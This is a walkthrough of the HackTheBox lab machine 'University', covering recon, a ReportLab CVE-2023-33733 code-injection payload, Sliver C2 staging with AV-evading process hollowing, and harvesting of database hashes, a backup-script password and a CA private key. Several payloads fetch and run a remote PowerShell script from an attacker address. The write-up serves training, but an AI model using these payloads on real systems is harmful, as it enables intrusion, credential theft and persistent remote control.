---
title: University
description: HackTheBox Season 6 Machine — Level Insane
date: 2025-01-25 02:47:35 +/-0005
categories: [WalkThrough, HTB]
tags: [Active Directory, HTB, Insane, Windows, Sliver, Ligolo-ng, Pivoting, DCSync, LPE, CVE‑2023‑21746, LocalPotato, CVE-2023-33733m RBCD]
---
![box-cover](https://cdn-images-1.medium.com/max/1000/0*yQTeukV6E1d3d0RO.jpg)
_https://app.hackthebox.com/machines/university_

---

بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيم 
{: .text-center }

---

## Summary


This is my comprehensive walkthrough for solving **University**, a multi-stage Active Directory machine on Hack The Box. This box required deep enumeration across multiple hosts, careful abuse of a custom certificate-based authentication system, and chaining privilege escalations through misconfigured signing workflows, Windows scheduled task abuse, and Active Directory delegation misconfigurations.

Initial enumeration of the public-facing university web portal revealed a certificate-based login requirement for professors by requesting a Certificate Sigining Request. After exploiting **CVE-2023-33733**, we gained access to the Domain Controller host as the user `WAO`, which allowed us to view the web application source code and uploaded certificate signing requests.

From this foothold, we pivoted into the internal network, identifying the Domain Controller, several Windows servers, and a Linux machine. On one Windows server, we discovered scheduled PowerShell scripts in an automation directory executed with elevated privileges.

By obtaining the Certificate Authority’s private key, we generated and self-signed a valid certificate impersonating a professor. This granted privileged access to the portal, enabling us to create new courses and upload lecture materials.

Further investigation revealed that uploaded lectures were processed by automated scripts. By uploading a signed lecture ZIP containing a malicious `.URL` file pointing to a reverse shell and registering our own public GPG key in the portal, we were able to execute arbitrary commands on the web server and gain a foothold.

We then leveraged **CVE-2023-21746 (LocalPotato)** to overwrite one of these privileged scripts (`wpad-cache-cleaner.ps1`) with our payload, causing it to execute under SYSTEM. This provided full local administrative access.

With admin rights, we dumped the SAM, SYSTEM, and SECURITY registry hives, as well as LSASS memory, revealing a clear-text default password shared by multiple domain accounts. A password spraying attack confirmed that several high-value accounts, including those with WinRM access, used this same password.

One such account, **Rose.L**, was a member of the **Account Operators** group with `ReadGMSAPassword` privileges over the managed service account **GMSA-PClient01\$**. This GMSA account had `AllowedToAct` privileges on the Domain Controller, enabling **Resource-Based Constrained Delegation (RBCD)**. Using the GMSA credentials, we impersonated a Domain Admin on the DC and executed commands with full domain privileges.

This chain highlights the risks of exposed private keys in authentication systems, insecure GPG signing workflows, privileged scheduled tasks, shared default passwords, and overly permissive delegation rights in Active Directory.

The machine offers multiple exploitation paths, especially after gaining access to several users some of whom belong to the Account Operators group.

Throughout this engagement, I challenged myself to rely solely on **Sliver C2** and **Ligolo-ng** for payload generation, port forwarding, and network pivoting—deliberately avoiding Metasploit to deepen my understanding and hands-on experience with these powerful, open-source tools.

Let’s walk through the exploitation in detail.

---

## 1. Reconnaissance

### Network Scanning

![Nmap Scan](https://cdn-images-1.medium.com/max/1000/1*r6WNr4EyHuc-0NkZT_7dug.png)

The Nmap scan reveals that the target is a Windows Active Directory environment hosting standard domain controller services such as **DNS** (53), **Kerberos** (88), **LDAP** (389/636/3268/3269), **SMB** (445), and **RPC** (135/593), which is typical for a domain controller. The domain is identified as **university.htb**, confirming the machine’s role within an Active Directory infrastructure.

A notable observation is the presence of an **HTTP** service running nginx (1.24.0) on port 80, which redirects to *http://university.htb/*. This suggests a custom web interface or application may be exposed and potentially integrated with the AD environment. Ensuring the host resolution for university.htb is in place will be essential for further web-based enumeration.

Our initial focus will be on LDAP and SMB for user enumeration, while also examining the HTTP service for any exposed functionality or authentication portals. The broad surface of exposed AD-related services suggests multiple possible enumeration paths even without credentials at this stage.

The clock skew is ~6 hours and 59 minutes, which would be a problem for Kerberos-based authentication and attacks if not calibrated.

### Environment Configuration
Before moving forward, it’s important to configure the environment properly for Kerberos-based authentication to avoid common issues later.

1. Update /etc/hosts for Local Name Resolution

    ```bash
    echo '10.10.11.39  university.htb' | sudo tee -a /etc/hosts
    ```
2. Sync System Time to Prevent Kerberos Time Skew Errors

    Kerberos is sensitive to time differences. We have to sync the machine time with the domain controller.

    ```bash
    sudo ntpdate -u university.htb
    ```
3. Configure `/etc/krb5.conf` for Kerberos

    We configure the `/etc/krb5.conf` file to point explicitly to the target domain for Kerberos authentication and its important if we would rely on tikets.
    ```conf
    [libdefaults]
        default_realm = UNIVERSITY.HTB
        dns_lookup_realm = false
        dns_lookup_kdc = false
        forwardable = true
        renewable = true

    [realms]
        UNIVERSITY.HTB = {
            kdc = 10.10.11.39
            admin_server = 10.10.11.39
        }

    [domain_realm]
        .university.htb = UNIVERSITY.HTB
        university.htb = UNIVERSITY.HTB
    ```

### Service Enumeration

#### 1. DNS

```bash
dig any @10.10.11.39 university.htb
```

![](https://cdn-images-1.medium.com/max/1000/1*xyME--ng8tfQaLkKIbmnXQ.png)

DNS records confirm that `dc.university.htb` is the domain controller for the domain. We already added it to the `/etc/hosts` file before. The administrative contact for the DNS zone is hostmaster, which is the default and doesn’t reveal any useful information.

#### 2. LDAP

```bash
ldapsearch -H ldap://10.10.11.39 -x -b "DC=university,DC=htb"
```

![](https://cdn-images-1.medium.com/max/1000/1*RRfSCl-CXYAnB-HSSzso7g.png)

Null-bind authentication on LDAP is not allowed.

#### 2. SMB

```bash
nxc smb 10.10.11.39 -u '' -p '' 
nxc smb 10.10.11.39 -u 'guest' -p '' 

```

![](https://cdn-images-1.medium.com/max/1000/1*ksFE85-H2e_eiRap8VVElw.png)
Anonymous and guest access to SMB are not permitted.

> **INFO:** Attempts to enumerate LDAP and SMB without credentials using null authentication yielded no significant information. As a result, the web service appears to be the most promising target for further enumeration and potential initial access.
{: .prompt-info }



#### 3. HTTP

> Always run Burp Suite in the background with the proxy enabled (without interception) while working with a web application for Logging traffic history for later analysis after the enumeration process.

{: .prompt-note }

![](https://cdn-images-1.medium.com/max/1000/1*HR6omoOXvVsFxDOgk7Q8Kg.png)
_http://university.htb_

We can login using credentials username and password or using signed-certificate
![](https://cdn-images-1.medium.com/max/1000/1*abwNCBClpQI94Iq7CmRZSw.png)
_http://university.htb/accounts/login/_

To use the certificate it has to be signed by the domain. 
![](https://cdn-images-1.medium.com/max/1000/1*6AEbMBKarH1sey8cjUU57g.png)
_http://university.htb/accounts/login/SDC/_

We can also Register an account as student or Professor, but for the professor account; account will be inactive until their team reviews the account details.

![](https://cdn-images-1.medium.com/max/1000/1*G48ZTnP1rEKSLBC3KYIp5Q.png)

So for now we will register an account as **Student**

![](https://cdn-images-1.medium.com/max/1000/1*8ldLrX5L8QaMdepCb-MYoQ.png)

The web application supports certificate-based authentication, allowing users to log in or perform actions like uploading lectures using a signed client certificate. It provides instructions to generate a CSR using OpenSSL:

```bash
openssl req -newkey rsa:2048 -keyout PK.key -out My-CSR.csr
```
The CSR must include a Common Name and email matching the user’s account details.

![](https://cdn-images-1.medium.com/max/1000/1*P4xd3dOiX8doa0ALDqP3qQ.png)
_http://university.htb/accounts/request_cert/_

This application is a university course management system designed for students and professors. Students can browse and search for available courses through a user-friendly dashboard, enroll in the ones they’re interested in, and access all related lectures and materials. Professors likely have the ability to create and manage courses, making the platform a centralized space for academic interaction and study preparation.

![](https://cdn-images-1.medium.com/max/1000/1*AWN0P1XPjL9W62wcDSWXxg.png)

When you click on Learn more or Enroll now it would redirect you to a page with more information about the course, in the end there is a lectures list when you click on any of them it would download lecture documents as a zip file.

![](https://cdn-images-1.medium.com/max/1000/1*SzQ9G66HgEtBp3Su-59CyA.png)

I checked both the download request and the server’s response, but they didn’t reveal any useful or sensitive information.

![](https://cdn-images-1.medium.com/max/1000/1*1DvWPI-8Pc9kq85JH6qvAw.png)

Same for the downloaded lecture, Nothing much important from the downloaded fiels, checking the content and Embedded metadata. 

![](https://cdn-images-1.medium.com/max/1000/1*iPeQWWhdPnA6tzktIIeemA.png)


The `Reference-*.url` files are Windows Internet Shortcut files that point to URLs. In an AD environment, they can be weaponized. If a professor account is compromised and lecture uploads are allowed, a crafted `.url` file with a malicious **UNC** path could trigger NTLM authentication and leak NetNTLM hashes. It could also point to a remote payload, depending on how the platform handles such files.

![](https://cdn-images-1.medium.com/max/1000/1*48eYDj_aeNAR_lcoF4Nr4w.png)

After exploring the website for a while, I discovered that it's possible to export my profile data.

![](https://cdn-images-1.medium.com/max/1000/1*f4-BPhmHfXe_-Qgx-FeZPg.png) 

Whenever such functionality exists, it's worth inspecting the request behind it. I examined the endpoint responsible for the export operation to identify any interesting behavior, such as LFI, exposed directories, or IDOR. I also reviewed the request headers and responses to gather insights into the backend technology such as the server type, framework, or how file downloads are handled.

In addition, I check how the export was being generated particularly if it involved **PDF generation**, which can introduce a valuable attack surface. PDF generation often relies on third-party libraries or system-level utilities, which, if misconfigured, could be vulnerable to issues like command injection.

Such implementation details can sometimes lead to unintended access or provide footholds for further enumeration.

## 2. Exploitation

### PDF Export Functionality & ReportLab RCE

![](https://cdn-images-1.medium.com/max/1000/1*q01pf49IAPjsiFxxoTTrFQ.png)

Although the downloaded PDF file didn’t contain much valuable information, the request itself revealed important backend details particularly that the site uses `pdf-1.4 (ReportLab)` for generating PDFs.

![](https://cdn-images-1.medium.com/max/1000/1*3dZzBHlTxk2S-SLbDYa8PA.png)

Searching for `pdf-1.4 reportlab` vulnerabilities, I found that it’s affected by a **critical RCE vulnerability: CVE-2023-33733**.

![](https://cdn-images-1.medium.com/max/1000/1*gX2KU24j4_nRM9QopE1Y7Q.png)

![](https://cdn-images-1.medium.com/max/1000/1*oEZuTzqG67VmwJL1mTgC0A.png)
_https://vuldb.com/?id.230713_

**CVE-2023–33733** This vulnerability affects ReportLab versions up to 3.6.12 and originates from the rl_safe_eval function, which is meant to safely evaluate expressions in PDF content. An attacker can craft malicious HTML that bypasses the sandbox, leading to arbitrary code execution via Python’s built-in functions.

If there’s any editable field in the user profile, we can potentially inject our payload there and then trigger the PDF export to execute it. This would effectively bypass the sandbox and lead to code execution. Based on the available profile fields, the most promising candidate is the **Bio** section — which is a Rich Text Editor. Since RTEs often support HTML formatting, it makes a good entry point for HTML-based injection, making it a likely vector for this exploit.

![](https://cdn-images-1.medium.com/max/1000/1*rsLWZT_7CNpVpPRqWHGLwg.png)

Check the author’s repo for more info and the POC [CODE INJECTION VULNERABILITY IN REPORTLAB PYTHON LIBRARY](https://github.com/c53elyas/CVE-2023-33733) read it carefully and don’t get stuck on the first PoC; our relevant exploit is at the bottom of the README [What Else?](https://github.com/c53elyas/CVE-2023-33733?tab=readme-ov-file#what-else)

The main PoC is  [poc.py](https://github.com/c53elyas/CVE-2023-33733/blob/master/code-injection-poc/poc.py) which demonstrates code injection using a crafted HTML payload. However, this PoC targets a general use case, we had to adapt based on our application scenari and fields so just take the HTML injection payload. 

![](https://cdn-images-1.medium.com/max/1000/1*yNUlbGTjQK0o_EQkw443Zw.png)

At first, the exploit didn’t work as expected. After re-reading the documentation, I discovered that the application wasn’t using the vulnerable `rl_safe_eval` flow directly.

Further inspection of the PDF download response revealed that the application uses xhtml2pdf, which internally calls ReportLab. This made sense since the export was converting an HTML profile page to a PDF.

![](https://cdn-images-1.medium.com/max/1000/1*v7DcBF0faJJFJurIZY7OUg.png)

Toward the end of the PoC repo, there’s a section targeting xhtml2pdf. That’s where I found the correct payload structure:
![](https://cdn-images-1.medium.com/max/1000/1*1-0k3lTyR-Tt2-YybXOKnw.png)


> **Why the Second Payload Worked** :- The second payload succeeded where the first failed due to how xhtml2pdf evaluates expressions:
+ The working version uses triple square brackets `[[[...]]]`, which are interpreted as executable expressions.
+ The non-working payload used just [ ... ], treated as a literal list (not evaluated).
+ The trick involving `[[].append(1) for none in ...]` helps avoid early termination and syntax errors within the sandboxed evaluation context.
{: .prompt-danger } 

To verify whether code execution is possible, we can simply test for an outbound request to our server. Add the following payload to the Bio field, fill in the other required profile fields, and submit the form. Then, trigger the Export Profile functionality to generate the PDF

```html
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('curl http://IP') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
               exploit
</font></para>
```
>    Don’t forget to replace the IP with your attacker's IP address and start a listener or HTTP server to capture the callback.

![](https://cdn-images-1.medium.com/max/1000/1*fFs9NOORLXAibJ-Rsq42bQ.png)

We have a connection
![](https://cdn-images-1.medium.com/max/1000/1*v-lmwGP0O5eY4HGksvt1Cg.png)

### Building our shell
#### PowerShell Shellcode Loader – Sliver Staged Payload	

We’ll use Sliver to generate a shellcode payload and deliver it using a PowerShell script that leverages process hollowing via dynamic Win32 API reflection, helping evade AV detection.

##### Step-by-Step: Generating Sliver Shellcode
1. Start the Sliver server
    ```bash
    sliver-server
    ```
2. Create a shellcode profile
    ```bash
    profiles new --http 10.10.16.39:8088 --format shellcode htb
    ```
3. Set up a staged listener
    Using staging makes the initial payload smaller and more evasive
    ```bash
    stage-listener --url tcp://10.10.16.39:4443 --profile htb
    ```
4. Start an HTTP listener for staging delivery
    ```bash
    http -L 10.10.16.39 -l 8088
    ```
5. Generate the stager payload
    ```bash
    generate stager --lhost 10.10.16.39 --lport 4443 --format ps1 --save staged.txt
    ```
![](https://cdn-images-1.medium.com/max/1000/1*-vWd1oTG_HyEw3Oz5VPOUw.png)

6. Confirm listeners are running using `jobs`
![](https://cdn-images-1.medium.com/max/1000/1*FNRz-_6UPKGzh4_uWCf_bQ.png) 


##### Modifying the DynWin32 Process Hollowing Script

We’ll use [DynWin32-ShellcodeProcessHollowing.ps1](https://gist.github.com/qtc-de/1ecc57264c8270f869614ddd12f2f276#file-dynwin32-shellcodeprocesshollowing-ps1), which uses dynamically resolved Win32 APIs and reflection to perform process hollowing; ideal for bypassing AV.

1. Download the script

    ```bash
    wget https://gist.githubusercontent.com/qtc-de/1ecc57264c8270f869614ddd12f2f276/raw/c5810a377af12b21629f25cd60b2e9c42713b8e8/DynWin32-ShellcodeProcessHollowing.ps1 -O shell.ps1
    ```
2. Copy the created sliver shellcode array from `staged.txt`

    ![](https://cdn-images-1.medium.com/max/1000/1*A_gU5zLJW1xbM50k8YtQVw.png)

3. Modify the PowerShell script

    Replace the `$SHELLCODE` array in `shell.ps1` with the one you copied.

    ![](https://cdn-images-1.medium.com/max/1000/1*gwzPCtZwDx1K_3viGVdx7w.png)

4. Start an HTTP server to serve `shell.ps1`
    ```bash
    python3 -m http.server 80
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*Qqaseuf-0Srxxy8CpOoFxA.png)

#### Final Payload – HTML Injection for Code Execution

Inject the following payload into the Bio field and trigger the Export Profile functionality again

```html
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell.exe -c IEX(curl -useb http://10.10.16.39:80/shell.ps1)') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
               exploit
</font></para>
```
> Make sure to replace the IP with your own attacker IP and ensure the HTTP server is running.

Once the profile is exported, the PDF generation will process the payload and trigger PowerShell execution via curl, fetching your shell script.
![](https://cdn-images-1.medium.com/max/1000/1*E1YmCX26OQXiv508_7-dFg.png) 

Wait a few minutes, and you should receive a Sliver session.

![](https://cdn-images-1.medium.com/max/1000/1*xhBN8HBiaPea50uGMp9znA.png)

Interacting with the shell using `use Sesson_id`, then collect machine information using `info`

![](https://cdn-images-1.medium.com/max/1000/1*Zw8lA4xP9Ea58S_jjVhHsg.png)

---

## 3. Initial access: `DC hosst`

We’ve gained access to the `DC` host as the `UNIVERSITY\WAO` user, with a shell running under the same context as the web application. This means we now have access to the website’s source code and data with the same privileges as the web app itself.

At this point, a logical next step is to enumerate the website configuration files and database for sensitive data such as credentials or password hashes. Since the site uses certificate-based authentication, it’s also worth checking for any stored certificates or private keys that could help escalate privileges or pivot further in the domain.


### Enumerating website configuration files 

IN the current directory there are 3 files on of them a sqlite DB, so i would download them for check offline. You can download files in sliver using `download path` from sliver console

![](https://cdn-images-1.medium.com/max/1000/1*rmBR8nrRRnf2JS5QmLgoPA.png)

Nothing was important in the `manage.py` and `start-server.bat` files. For the db it has many tables.

![](https://cdn-images-1.medium.com/max/1000/1*mbCwhTIsk4PRsP1V0uei0A.png)

#### DB Tables
These are the important tables in the database

##### 1. University_customuser

| id | password | last_login | username | first_name | last_name | bio | csr | is_active | is_staff | is_superuser | failed_login_attempts | address | joined_at | image | user_type | email |
|----|----------|------------|----------|------------|-----------|-----|-----|------------|----------|---------------|------------------------|---------|------------|-------|------------|-------|
| 2 | pbkdf2_sha256$600000$igb7CzR3ivxQT4urvx0lWw$dAfkiIa438POS8K8s2dRNLy2BKZv7jxDnVuXqbZ61+s= | 2024-02-26 01:47:32.992418 | george | george | lantern |  |  | 1 | 0 | 0 | 0 | Canada West - Vancouver | 2024-02-19 23:23:16.293609 | static/assets/images/users_profiles/2.png | Professor | george@university.htb |
| 3 | pbkdf2_sha256$600000$i8XRGybY2ASqA3kEuTW4XH$SwK7A52nA1KOnuniKifqWzrjiIyOnrZu7sf+Zvq44qc= | 2024-02-20 01:06:28.437570 | carol | Carol | Helgen |  |  | 1 | 0 | 0 | 0 | USA - Washington | 2024-02-19 23:25:14.919010 | static/assets/images/users_profiles/3.jpg | Professor | carol@science.com |
| 4 | pbkdf2_sha256$600000$Bg8pRHaZsbGpLwirrZPvvn$7CtXYJhBDrGhiCvjma7X/AOKRWZS2SP0H6PAXvT96Vw= | 2024-02-20 00:59:29.687668 | Nour | Nour | Qasso |  |  | 1 | 0 | 0 | 0 | Germany - Frankfurt | 2024-02-19 23:27:04.700197 | static/assets/images/users_profiles/4.jpg | Professor | nour.qasso@gmail.com |
| 5 | pbkdf2_sha256$600000$VzP8VVjEQgQw6HvYAftmCl$s9k3UC/e2++hhQDF2KzhunOaAqxbi4rugRb42dC6qr0= | 2024-02-20 00:37:55.455163 | martin.rose | Martin | Rose |  |  | 1 | 0 | 0 | 0 | US West - Los Angeles | 2024-02-19 23:28:49.293710 | static/assets/images/users_profiles/5.jpg | Professor | martin.rose@hotmail.com |
| 6 | pbkdf2_sha256$600000$1s48WhgRDulQ6FsNgnXjot$SZ4piS9Ryf4mgIj0prEjN+F0pGEDtNti3b9WaQfAeTk= | 2024-09-16 12:43:05.500724 | nya | Nya | Laracrof |  | static/assets/uploads/CSRs/6_mnY36oU.csr | 1 | 0 | 0 | 0 | UK - London | 2024-02-19 23:31:30.168489 | static/assets/images/users_profiles/6.jpg | Professor | nya.laracrof@skype.com |
| 7 | pbkdf2_sha256$600000$70XtdR4HrHHignt7EHiOpT$RP9/4PKHmbtCBq0FOPqyppQKjXntM89vc7jGyjk/zAk= | 2024-02-26 01:42:16.677697 | Steven.U | Steven | Universe | <h3>The First student in this university!</h3> | static/assets/uploads/CSRs/7.csr | 1 | 0 | 0 | 0 | Italy - Milan | 2024-02-25 23:08:44.508623 | static/assets/images/users_profiles/7.jpeg | Student | steven@yahoo.com |
| 9 | pbkdf2_sha256$600000$6bH9ajs1IQNMfZs0uTUqbJ$/iNa6PWJxkeAZWfca5b2hUG/Hvn4sv5PTye6a1YCLg4= | 2025-07-26 08:13:18.808027 | B4l3rI0n | test | test | <p><para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell.exe -c IEX(curl -useb http://10.10.16.39:80/shell.ps1)') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'"></p><p>exploit</p><p></font></para></p> |  | 1 | 0 | 0 | 0 | test | 2025-07-26 08:13:11.785794 | static/assets/images/users_profiles/default.png | Student | B4l3rI0n@test.com |


The password is hashed using the pbkdf2_sha256 algorithm with 260,000 iterations, which is a computationally expensive and time-consuming method designed to resist brute-force attacks. Due to the high iteration count and the use of a unique salt, cracking this hash is highly impractical without a significant lead or a known weak password. Unless we uncover a clue or a potential candidate password in future stages of the engagement, we will defer further cracking attempts and revisit this step later if necessary.

But for now we have 5 professors email addresses and CSR for one of them. If we found later the keys used to sign these certificates we would have access to a professor account. 

| email                     | csr                                       |
|---------------------------|-------------------------------------------|
| george@university.htb     |                                           |
| carol@science.com         |                                           |
| nour.qasso@gmail.com      |                                           |
| martin.rose@hotmail.com   |                                           |
| nya.laracrof@skype.com    | static/assets/uploads/CSRs/6_mnY36oU.csr |
| steven@yahoo.com          | static/assets/uploads/CSRs/7.csr         |
| B4l3rI0n@test.com         |                                           |

> **INFO:** Certificate Signing Request (CSR) is a message sent to a Certificate Authority (CA) to request the signing of a public key
{: .prompt-info }


##### 2. University_professor

| customuser_ptr_id | department_id | public_key                               |
|-------------------|---------------|------------------------------------------|
| 2                 | 2             | static/assets/uploads/Pub_KEYs/2.asc     |
| 3                 | 4             | static/assets/uploads/Pub_KEYs/3.asc     |
| 4                 | 3             | static/assets/uploads/Pub_KEYs/4.asc     |
| 5                 | 8             | static/assets/uploads/Pub_KEYs/5.asc     |
| 6                 | 6             | static/assets/uploads/Pub_KEYs/6.asc     |

For future enumeration we may find important files in this directory  `static/assets/uploads`.  

##### 3. django_session

| session_key                         | session_data                                                                                                                                                                                                                                                                                                                                                                   | expire_date                |
|------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------|
| k7qe8j4r1sis6pjnhjcogytrjyn59wec   | .eJxVjEsOAiEQBe_C2pDmK7h07xlIQ4OMGkiGmZXx7oZkFrp9VfXeLOC-1bCPvIaF2IUJdvrdIqZnbhPQA9u989Tbti6RT4UfdPBbp_y6Hu7fQcVRZ22L1QIoARkjwJLKJXtrwGifsikgrUcqToJSWAooqyU5rQR44aI5s88X1oA3EA:1rcCr1:WSvLnR07E_WB8NdLOoIShUtZMw1wmdJHtLDf3jdn0nY     | 2024-03-04 23:15:19.590652 |
| 1wywr0zvuxonv7ttj6n6u41upap8bahe   | .eJxVjMsKwjAQAP8lZwl5kN3Wo3e_oWyyWVOVBPo4Ff9dAj3odWaYQ020b2Xa17xMM6urAnX5ZZHSK9cu-En10XRqdVvmqHuiT7vqe-P8vp3t36DQWvpW2FtMZIEDAPhoMqIMXkhGE3EIjrwLnAwh-uyAMRnJdoREYplEfb7nSjhq:1rcDGM:eG2X2aAvYCdEC1do3hLYWeUYn46Ixm89t2FYTmNdqRE       | 2024-03-04 23:41:30.388340 |
| hco45en49uem72ij8x53bh8yd8l8l2oa   | .eJxVjMsKwjAQAP8lZwl5kN3Wo3e_oWyyWVOVBPo4Ff9dAj3odWaYQ020b2Xa17xMM6urAnX5ZZHSK9cu-En10XRqdVvmqHuiT7vqe-P8vp3t36DQWvpW2FtMZIEDAPhoMqIMXkhGE3EIjrwLnAwh-uyAMRnJdoREYplEfb7nSjhq:1rcDeC:ZeHMHkYGcH2MaHSZuoqM3JG5dVzaN95xXB4D8dJ1LfM     | 2024-03-05 00:06:08.434309 |
| vu9by27zqd0rt4s801bucti8ids22xz8   | .eJxVjEEOwiAQRe_C2hCkMA4u3fcMZAZGqRpISrsy3l2bdKHb_977LxVpXUpcu8xxyuqsrDr8bkzpIXUD-U711nRqdZkn1puid9r12LI8L7v7d1Col28tR5JM2Tkrg5GAwaK9EoDBRODMgCwAjMLo8JSEmTwCZkeekwcf1PsD9rs4Rw:1rcEk5:yMN-i9OuJgFYGX_hyY9upanrhfnNd_3CkOpoUVopRP8   | 2024-03-05 01:16:17.078808 |
| iatduf8366zvqc4mrcej5vp17ujuv6lh   | .eJxVjEsOAiEQBe_C2pDmK7h07xlIQ4OMGkiGmZXx7oZkFrp9VfXeLOC-1bCPvIaF2IUJdvrdIqZnbhPQA9u989Tbti6RT4UfdPBbp_y6Hu7fQcVRZ22L1QIoARkjwJLKJXtrwGifsikgrUcqToJSWAooqyU5rQR44aI5s88X1oA3EA:1rgkqW:d8KjE9H3GFZydKe-KXC4UAKu045HCPOiqISbwHxwoBE     | 2024-03-17 12:21:36.726575 |
| y4v1sxx98hbomv267ya87s94q4223pl2   | .eJxVjMsOwiAUBf-FtSGFUh4u3fsNhPtAqgaS0q6M_65NutDtmZnzEjFta4lb5yXOJM7CitPvBgkfXHdA91RvTWKr6zKD3BV50C6vjfh5Ody_g5J6-dYYhqxDQvQ0BtBomY0Z0qi0GRknFXJgJAU0gePMBNk6o7yDzD5oQvH-AAtJOTY:1sqB4L:rJx2Sz3YksklLaQBo3QYlF-Eq_Eji4imT5QIDy6EdOM | 2024-09-30 12:43:05.531763 |
| 2vfzij61cqvwf73oc3eq3miwqwtkc0rj   | .eJxVjDsOwyAQBe9CHSGWjwUp0-cMaGHXwUkEkrErK3ePLblI2jczbxMR16XEtfMcJxJXEcTld0uYX1wPQE-sjyZzq8s8JXko8qRd3hvx-3a6fwcFe9nrTMzgLKFi8hRCSk5xBqZgNCUaMQ_WOIRhJ8oAaJ_D6Mla1GjBgvh8ASKOOLM:1ufa1u:tfzYQXu0DEBneKm2bx4DwDuHWXtvnp3YkSGwqFKNjZs | 2025-08-09 08:13:18.823671 |

These sessions are all expired and useless the lastone for my account so it is still valid, unless we find Django `SECRET_KEY` for Session decoding these data is useless. 


If you wish you can dump all the data to csv file for better inspection

```
.headers on
.mode csv
.output dump.csv
.dump
.output stdout
```

#### Other Directories

##### DB Backup directory

There is a DB Backup directory in the `C:\Web`, this directory contains backup script automator to auomate the process, we can download it offline for check.

![](https://cdn-images-1.medium.com/max/1000/1*xOBnuvd9_OQMlXvOtQMMQQ.png)

This PowerShell script creates a password-protected ZIP backup of the previously enumerated db.sqlite3 using the password **WebAO1337**, which may be a valid user password worth testing.

![](https://cdn-images-1.medium.com/max/1000/1*ZCn9hXmyxEN-Pxh5MHwWRw.png)

Checking if the password is valid for the current user `WAO` using [nxc_bruter](https://github.com/B4l3rI0n/nxc_bruter) which dependes on nxc it just spray using services we need to check at once instead or repeating the process over each service.

![](https://cdn-images-1.medium.com/max/1000/1*LBQVpU-g7JMDkBe2MwgjGg.png)

The password is valid and we have access to the machine via winrm, doesn't matter which console we use but i would stick with the sliver shell for now as it is more stable than `evil-winrm` but later i would not wait for the shell i would use evil-winrm directly

##### Certificate Files

The web application directory contains certificate-related files, including `rootCA.crt` and `rootCA.key`, located at `C:\Web\University\CA`. The presence of the root certificate authority’s private key (rootCA.key) strongly indicates that the application implements client certificate authentication and uses a local certificate authority to sign user submitted CSRs, allowing it to issue client certificates internally.

With access to the CA's private key, we can forge valid client certificates. This would allow us to impersonate trusted users and gain unauthorized access to the application.

![](https://cdn-images-1.medium.com/max/1000/1*Lui3lOoDfF-bzPgMhHXJYQ.png)

Additionally, I found multiple client certificate signing requests (.csr files) in `C:\Web\University\static\assets\uploads\CSRs`, which were previously identified in the database.
![](https://cdn-images-1.medium.com/max/1000/1*0v9DwNz9j3c5dwey4pmyZw.png)

Download both CSR files and CA directory

---

### Mapping the Domain with BloodHound


For this step, I used [Bloodhound CE](https://github.com/SpecterOps/BloodHound), the actively maintained version of BloodHound. There are many ways to enumerate and collect the necessary data
+ Remote Enumeration
    + Using BloodHound CE Python [bloodhound-ce-python](https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce)
    ```bash
    bloodhound-ce-python -u 'WAO' -p 'WebAO1337' -ns 10.10.11.39 -d university.htb -c all --zip  --dns-tcp --dns-timeout 10
    ```
    + Using nxc 
    ```bash
    nxc ldap 10.10.11.39 -u wao -p WebAO1337  --bloodhound --collection All --dns-server 10.10.11.39
    ```
+ Local Enumeration (preferred) using `SharpHound`
    

    This is the most reliable one. Using the Sliver shell, I opted for SharpHound, which can collect more detailed data including certificates.


    1. Download the SharpHound collector 
        ```bash
        wget https://github.com/SpecterOps/SharpHound/releases/download/v2.7.0/SharpHound_v2.7.0_windows_x86.zip 
        unzip SharpHound_v2.7.0_windows_x86.zip
        ```
    2. Upload via Sliver shell `upload SharpHound.exe`
        
        If upload fails you can enter the interacting shell then upload it manually using 
        ```powershell
        certutil -urlcache -split -f http://10.10.16.39:8081/SharpHound.exe
        ``` 
        ![](https://cdn-images-1.medium.com/max/1000/1*ed7TqD7kGJeE79E-3Jlh5g.png)
    3. Using interacting shell in sliver `shell`
        ![](https://cdn-images-1.medium.com/max/1000/1*wLtVZwYoHy_PvjPpIh3hKA.png)
    4. Collect data
        ```powershell
        .\SharpHound.exe -c all
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*nfYrxisCNlYoITR_lUK48g.png)
    5. Download collected data
        ```
        exit
        download BloodHound.zip
        ```
    6. Ingest your collected data

#### Bloodhound Analysis

+ Our owned user `WAO` is a member of the `Remote Management Users` group, explaining our WinRM access.
+ He is also in the `Web Developers` group but has no useful privileges for more escalation.

    ![](https://cdn-images-1.medium.com/max/1000/1*hz-a4qXUAO2LUq0b9kXe9w.png)

+ Only one Domain Admin exists, and no users have DCSync rights.

***However, we discovered:***

+ There is a high value Group `BACKUP OPERATORS` and `BROSE.W` user is member of this group

    ![](https://cdn-images-1.medium.com/max/1000/1*rShZP8n6bw3UhflXiVGUNA.png)

+ `BROSE.W` is also part of the `HELP DESK` group, which belongs to `Account operators` granting powerful permissions over the domain.
    ![](https://cdn-images-1.medium.com/max/1000/1*u3hvooDIiXjYHofpKRGYAQ.png)
    
